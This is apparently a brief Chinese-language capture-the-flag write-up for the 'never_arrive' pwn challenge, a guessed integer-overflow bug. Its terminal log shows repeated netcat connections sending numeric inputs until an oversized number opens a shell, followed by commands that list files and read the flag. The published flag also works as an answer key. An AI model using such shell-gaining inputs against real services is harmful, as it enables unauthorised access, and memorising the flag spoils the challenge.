# never_arrive

试一试就拿到了 Shell ，没具体看 ELF ，应该和整数溢出有关。

```bash
(.venv) scetayh@tarikko-gentoo ~/Projects/nssctf-fall-recruitment-2026-writeups/pwn/3 $ nc node10.anna.nssnode.cn 28174
我只想要256以下的数字，你能帮帮我吗?
12
(.venv) scetayh@tarikko-gentoo ~/Projects/nssctf-fall-recruitment-2026-writeups/pwn/3 $ nc node10.anna.nssnode.cn 28174
我只想要256以下的数字，你能帮帮我吗?
11
(.venv) scetayh@tarikko-gentoo ~/Projects/nssctf-fall-recruitment-2026-writeups/pwn/3 $ nc node10.anna.nssnode.cn 28174
我只想要256以下的数字，你能帮帮我吗?
2223
又大又小该怎么办啊
try again?
(.venv) scetayh@tarikko-gentoo ~/Projects/nssctf-fall-recruitment-2026-writeups/pwn/3 $ nc node10.anna.nssnode.cn 28174
我只想要256以下的数字，你能帮帮我吗?
-11
(.venv) scetayh@tarikko-gentoo ~/Projects/nssctf-fall-recruitment-2026-writeups/pwn/3 $ nc node10.anna.nssnode.cn 28174
我只想要256以下的数字，你能帮帮我吗?
-114514
(.venv) scetayh@tarikko-gentoo ~/Projects/nssctf-fall-recruitment-2026-writeups/pwn/3 $ nc node10.anna.nssnode.cn 28174
我只想要256以下的数字，你能帮帮我吗?
25390827358237952738542398542
-1919810
/bin/sh: 1: -191981: not found
ls
attachment
bin
dev
flag
lib
lib32
lib64
libexec
libx32
cat flag
NSSCTF{80ae7281-692b-45f4-9c89-5d6488548b85}
exit
```

Flag 为 `NSSCTF{80ae7281-692b-45f4-9c89-5d6488548b85}` 。